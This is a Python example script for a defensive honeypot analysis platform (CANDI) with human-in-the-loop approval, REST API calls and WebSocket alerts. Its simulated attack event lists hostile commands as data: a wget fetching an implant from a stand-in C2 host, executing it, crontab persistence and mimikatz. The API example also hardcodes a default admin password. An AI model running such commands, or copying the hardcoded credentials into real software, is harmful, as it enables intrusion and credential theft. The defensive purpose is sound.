"""
Example Usage: Complete HITL + CANDI Integration
Demonstrates end-to-end workflow from honeypot to human decision
"""

import asyncio
import logging
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


async def example_complete_workflow():
    """
    Complete workflow example:
    1. Honeypot captures attack
    2. CANDI analyzes threat
    3. HITL decision required
    4. Human approves actions
    5. Actions are implemented
    """
    from candi import CANDICore
    from hitl.candi_integration import HITLIntegration, register_hitl_with_candi

    logger.info("=" * 60)
    logger.info("STARTING COMPLETE WORKFLOW EXAMPLE")
    logger.info("=" * 60)

    # Step 1: Initialize CANDI Core
    logger.info("\n[1/5] Initializing CANDI Core Engine...")
    candi = CANDICore()
    await candi.start(num_workers=2)
    logger.info("✅ CANDI Core started with 2 workers")

    # Step 2: Initialize HITL Integration
    logger.info("\n[2/5] Initializing HITL Integration...")
    hitl = HITLIntegration(hitl_api_url="http://localhost:8000/api")
    await register_hitl_with_candi(candi, hitl)
    logger.info("✅ HITL integration registered with CANDI")

    # Step 3: Simulate honeypot event (APT-like attack)
    logger.info("\n[3/5] Simulating APT attack from honeypot...")
    attack_event = {
        'attack_id': 'apt_attack_001',
        'honeypot_type': 'ssh',
        'source_ip': '185.86.148.10',  # Known APT28 IP
        'honeypot_id': 'cowrie_ssh_01',
        'timestamp': datetime.now(),
        'auth_success': True,
        'commands': [
            'uname -a',  # Reconnaissance
            'whoami',
            'wget http://apt28-c2.example.com/implant.elf',  # Custom malware
            'chmod +x implant.elf',
            './implant.elf',
            'crontab -e',  # Persistence
            'mimikatz',  # Credential dumping
        ],
        'session_duration': 300.0
    }

    logger.info(f"  Source IP: {attack_event['source_ip']}")
    logger.info(f"  Commands executed: {len(attack_event['commands'])}")

    # Step 4: CANDI analyzes the attack
    logger.info("\n[4/5] CANDI analyzing attack...")
    analysis = await candi.analyze_honeypot_event(attack_event)

    logger.info(f"  Threat Level: {analysis.threat_level.name}")
    logger.info(f"  Attribution: {analysis.attribution.attributed_actor} "
                f"({analysis.attribution.confidence:.1f}% confidence)")
    logger.info(f"  IOCs extracted: {len(analysis.iocs)}")
    logger.info(f"  TTPs mapped: {len(analysis.ttps)}")
    logger.info(f"  HITL Required: {analysis.requires_hitl}")

    # If HITL required, decision will be automatically submitted
    if analysis.requires_hitl:
        logger.info("\n[5/5] HITL decision required - request submitted automatically")
        logger.info("  Decision Priority: CRITICAL")
        logger.info("  Waiting for human decision...")

        # In real scenario, human would review via web console
        # For demo, we can simulate checking status
        logger.info("\n  (In production, security analyst would:")
        logger.info("   1. Review attack details in HITL Console")
        logger.info("   2. Examine forensic evidence")
        logger.info("   3. Verify attribution confidence")
        logger.info("   4. Approve response actions")
        logger.info("   5. Actions would be automatically implemented)")

    # Step 6: Get statistics
    logger.info("\n[STATS] System Statistics:")
    candi_stats = candi.get_stats()
    hitl_stats = hitl.get_stats()

    logger.info("  CANDI:")
    logger.info(f"    Total analyzed: {candi_stats['total_analyzed']}")
    logger.info(f"    APT detected: {candi_stats['by_threat_level']['APT']}")
    logger.info(f"    HITL requests: {candi_stats['hitl_requests']}")

    logger.info("  HITL:")
    logger.info(f"    Total submitted: {hitl_stats['total_submitted']}")
    logger.info(f"    Pending decisions: {hitl_stats['pending_decisions']}")

    # Cleanup
    logger.info("\n[CLEANUP] Stopping services...")
    await candi.stop()
    await hitl.close()

    logger.info("\n" + "=" * 60)
    logger.info("WORKFLOW COMPLETE")
    logger.info("=" * 60)


async def example_hitl_api_usage():
    """
    Example of direct HITL API usage
    """
    import httpx

    logger.info("=" * 60)
    logger.info("HITL API USAGE EXAMPLE")
    logger.info("=" * 60)

    client = httpx.AsyncClient(base_url="http://localhost:8000")

    try:
        # Step 1: Login
        logger.info("\n[1] Logging in...")
        response = await client.post(
            "/api/auth/login",
            data={
                "username": "admin",
                "password": "ChangeMe123!"
            }
        )

        if response.status_code == 200:
            token_data = response.json()
            access_token = token_data["access_token"]
            logger.info("✅ Login successful")

            headers = {"Authorization": f"Bearer {access_token}"}

            # Step 2: Get system status
            logger.info("\n[2] Getting system status...")
            response = await client.get("/api/status", headers=headers)
            if response.status_code == 200:
                status = response.json()
                logger.info(f"  Pending decisions: {status['pending_decisions']}")
                logger.info(f"  Critical pending: {status['critical_pending']}")

            # Step 3: Get pending decisions
            logger.info("\n[3] Getting pending decisions...")
            response = await client.get("/api/decisions/pending", headers=headers)
            if response.status_code == 200:
                decisions = response.json()
                logger.info(f"  Found {len(decisions)} pending decisions")

                for decision in decisions[:3]:
                    logger.info(f"    - {decision['analysis_id']}: "
                                f"{decision['threat_level']} (priority: {decision['priority']})")

            # Step 4: Get statistics
            logger.info("\n[4] Getting decision statistics...")
            response = await client.get("/api/decisions/stats/summary", headers=headers)
            if response.status_code == 200:
                stats = response.json()
                logger.info(f"  Total pending: {stats['total_pending']}")
                logger.info(f"  Critical: {stats['critical_pending']}")
                logger.info(f"  High: {stats['high_pending']}")
                logger.info(f"  Avg response time: {stats['avg_response_time_minutes']:.1f} minutes")

        else:
            logger.error(f"Login failed: {response.status_code}")

    finally:
        await client.aclose()

    logger.info("\n" + "=" * 60)
    logger.info("API USAGE COMPLETE")
    logger.info("=" * 60)


async def example_websocket_alerts():
    """
    Example of WebSocket real-time alerts
    """
    import websockets
    import json

    logger.info("=" * 60)
    logger.info("WEBSOCKET ALERTS EXAMPLE")
    logger.info("=" * 60)

    try:
        logger.info("\n[1] Connecting to WebSocket...")
        async with websockets.connect("ws://localhost:8000/ws/admin") as websocket:
            logger.info("✅ WebSocket connected")

            # Subscribe to critical alerts
            logger.info("\n[2] Subscribing to critical alerts...")
            await websocket.send(json.dumps({
                "type": "subscribe",
                "alert_types": ["critical_threat", "apt_detected", "honeytoken_triggered"]
            }))

            # Listen for alerts
            logger.info("\n[3] Listening for alerts (press Ctrl+C to stop)...")
            while True:
                try:
                    message = await asyncio.wait_for(websocket.recv(), timeout=30.0)
                    data = json.loads(message)

                    if data.get("type") == "alert":
                        alert = data["alert"]
                        logger.info("\n🚨 ALERT RECEIVED:")
                        logger.info(f"  Type: {alert['alert_type']}")
                        logger.info(f"  Priority: {alert['priority']}")
                        logger.info(f"  Title: {alert['title']}")
                        logger.info(f"  Message: {alert['message']}")

                    elif data.get("type") == "heartbeat":
                        logger.debug("Heartbeat received")

                except asyncio.TimeoutError:
                    # Send ping
                    await websocket.send(json.dumps({"type": "ping"}))

    except KeyboardInterrupt:
        logger.info("\n\nStopping WebSocket listener...")

    except Exception as e:
        logger.error(f"WebSocket error: {e}")

    logger.info("\n" + "=" * 60)
    logger.info("WEBSOCKET EXAMPLE COMPLETE")
    logger.info("=" * 60)


if __name__ == "__main__":
    import sys

    if len(sys.argv) > 1:
        example = sys.argv[1]

        if example == "workflow":
            asyncio.run(example_complete_workflow())
        elif example == "api":
            asyncio.run(example_hitl_api_usage())
        elif example == "websocket":
            asyncio.run(example_websocket_alerts())
        else:
            print(f"Unknown example: {example}")
            print("Available examples: workflow, api, websocket")
    else:
        print("Usage:")
        print("  python example_usage.py workflow    - Complete CANDI + HITL workflow")
        print("  python example_usage.py api         - HITL API usage examples")
        print("  python example_usage.py websocket   - WebSocket real-time alerts")
